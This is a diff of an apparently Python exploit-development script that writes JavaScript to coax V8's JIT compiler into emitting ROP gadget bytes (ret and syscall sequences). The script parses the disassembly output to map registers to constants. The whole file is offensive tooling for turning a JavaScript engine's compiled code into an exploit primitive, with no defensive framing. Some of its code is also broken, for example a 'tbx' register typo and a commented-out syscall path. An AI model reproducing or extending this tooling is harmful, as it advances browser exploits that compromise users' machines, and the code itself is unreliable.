@@ -5,13 +5,9 @@ import pathlib
 
 
 gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
-# 48 8d 5a c3             lea    rbx,[rdx-0x3d]
-# 48 8d 5e c3             lea    rbx,[rsi-0x3d]
-# 48 8d 58 c3             lea    rbx,[rax-0x3d]
-# 48 8d 5f c3             lea    rbx,[rdi-0x3d]
-rs_set = {('rbx', 'rdx'), ('rbx', 'rsi'), ('rbx', 'rax'), ('rbx', 'rdi')}
+rs_set = {'rdx', 'r11', 'rsi', 'rbx', 'rdi', 'r8', 'rcx'}
 exec_path = ''
-count = 48
+count = 12
 
 def get_registers(log:str):
     f = open(log, 'r')
@@ -23,11 +19,17 @@ def get_registers(log:str):
     lines = f.readlines()
     mm = dict()
     for line in lines:
+        if line.find('0xc3') != -1 and line.find(',[') != -1:
+            dd = line.split()
+            # print gadget line
+            print(dd[2], ' '.join(dd[3:]))
         for num in nums:
-            if line.rfind(num) != -1 and line[line.rfind(num) - 1] == '+' and line.find('leal') != -1:
-                # print(line)
-                mm[(line[line.find('r') : line.find(',')], line[line.find(',') + 2: line.find('+')])] = num[2:]
-                break
+            if line.find(num) != -1 and line[line.find(num) - 1] == ',':
+                if line[line.find('r') : line.find(num) - 1] in mm.keys():
+                    print('conflict at ' + line[line.find('r') : line.find(num) - 1])
+                else:
+                    mm[line[line.find('r') : line.find(num) - 1]] = num[2:]
+                    break
     return mm
 
 def excute_js(js:str, filename:str)->bool:
@@ -48,46 +50,55 @@ def excute_js(js:str, filename:str)->bool:
     
     return False
 
-def generate_template(count:int, indent:int):
+def generate_template(count:int):
     header = '''
-function jsc('''
+var array = new Uint8Array();
+function syscall_jsc('''
 
     for i in range(count - 1):
         header += 'var' + str(i) + ', '
     header += 'var' + str(count - 1) + '){\n'
     base = 110
     middle1 = ''
-    idx = 0
     for i in range(count):
-        for j in range(indent):
-            var = 't' + str(idx)
-            middle1 += '\tvar ' + var + ' = var' + str(i) + ' + 0x' + str(base) + ';\n'
-            base += 1
-            idx += 1
+        var = 't' + str(i)
+        middle1 += '\tvar ' + var + ' = var' + str(i) + ' & 0x' + str(base) + ';\n'
+        base += 1
     
+    jsc = ''
+    base = 11
+    for i in range(count):
+        jsc += '\tvar i' + str(i) + ' = t' + str(i) + '+ 0x' + str(base) + ';\n'
+        base += 1
 
-
-    middle2 = '\treturn '
-    ops = ['&', '|', '^']
-    for i in range(idx - 1):
-        middle2 += 't' + str(i) + ' ' + '&' + ' '
-    middle2 += 't' + str(idx-1) + ';\n}\n'
+    middle = '\treturn '
+    for i in range(count - 1):
+        middle += 't' + str(i) + ' ' + ' + '
+    # middle += 't' + str(count-1) + ' | s;\n}\n'
+    middle += 't' + str(count-1) + ' | ('
+    for i in range(count - 1):
+        middle += 'i' + str(i) + ' + '
+    middle += 'i' + str(count - 1) + ');\n}\n'
 
     tail = '''
 for(var i = 0; i < 0x10000; i++)
 {
 '''
-    tail += '\tjsc('
+    tail += '\tsyscall_jsc('
     for i in range(count - 1):
         tail += '0xc' + str(i) + ', '
     tail += '0xc' + str(count - 1) + ');'
     tail += '\n}\n'
 
-    excute_js(header + middle1 + middle2 + tail, 'test')
+    indent = ''
+    for i in range(12):
+        for j in range(i):
+            indent += '\t\tvar i' + str(j)
+    excute_js(header + middle1 + jsc + middle + tail, 'test')
 
 def gen_jsc(r1:str, r2:str):
     base = 110
-    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 2 + 0xc3;\n'
+    jsc = 'var s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 2 + 0xc3;\n'
     jsc += '\treturn '
     l = False
     for i in range(count):
@@ -101,7 +112,7 @@ def gen_jsc(r1:str, r2:str):
 
 def gen_syscall(r1:str, r2:str):
     base = 110
-    jsc = '\tvar s = t' + str(int(rs_map[r1]) - base) + ' + t' + str(int(rs_map[r2]) - base) + ' * 1 + 0x5;\n'
+    jsc = '\tvar s = t' + str(int(rs_map[r2]) - base) + ' - 0x3d;\n'
     jsc += '\treturn '
     l = False
     for i in range(count):
@@ -136,7 +147,22 @@ def generate_js(filename:str):
     # 48 8d 5e c3             lea    rbx,[rsi-0x3d]
     # 48 8d 58 c3             lea    rbx,[rax-0x3d]
     # 48 8d 5f c3             lea    rbx,[rdi-0x3d]
-    
+
+    jsc5ac3 = gen_jsc('rbx', 'rdx')
+    if not excute_js(header + jsc5ac3 + tail, '5ac3'):
+        print('generate 5ac3 failed')
+    jsc5ec3 = gen_jsc('rbx', 'rsi')
+    if not excute_js(header + jsc5ec3 + tail, '5ec3'):
+        print('generate 5ec3 failed')
+    jsc5fc3 = gen_jsc('tbx', 'rax')
+    if not excute_js(header + jsc5fc3 + tail, '5fc3'):
+        print('generate 5fc3 failed')
+    jsc58c3 = gen_jsc('rbx', 'rdi')
+    if not excute_js(header + jsc58c3 + tail, '58c3'):
+        print('generate 58c3 failed')
+    # jsc0f05 = gen_syscall('rcx', 'rdi')
+    # if not excute_js(header + jsc0f05 + tail, '0f05'):
+        # print('generate 0f05 failed')
     
     out = open('jsc.js', 'w')
     # write jsc function
@@ -154,27 +180,12 @@ if __name__ == "__main__":
         print('path of v8 error')
         exit()
 
-    count = 12
-    val = 0
-    # while count < 24:
-    #     for j in range(1, count + 1):
-    #         generate_template(count, j)
-    #         rs_map = get_registers('test.txt')
-    #         if len(rs_map) > val:
-    #             val = len(rs_map)
-    #             print(len(rs_map))
-    #             print(count, j)
-    #             print(rs_map.keys() & rs_set)
-    #             print(rs_map)
-    #     count += 1
-    
-    generate_template(12, 3)
+    generate_template(count)
     rs_map = get_registers('test.txt')
-
     if not rs_set < set(rs_map.keys()):
         print('needed ', rs_set)
-        print('has', set(rs_map.keys()) & rs_set)
+        print('has', set(rs_map.keys()))
         print('resgister are not enough')
         exit()
-    # generate_js('test.js')
-    # print('done')
+    print(rs_map)
+    print('done')
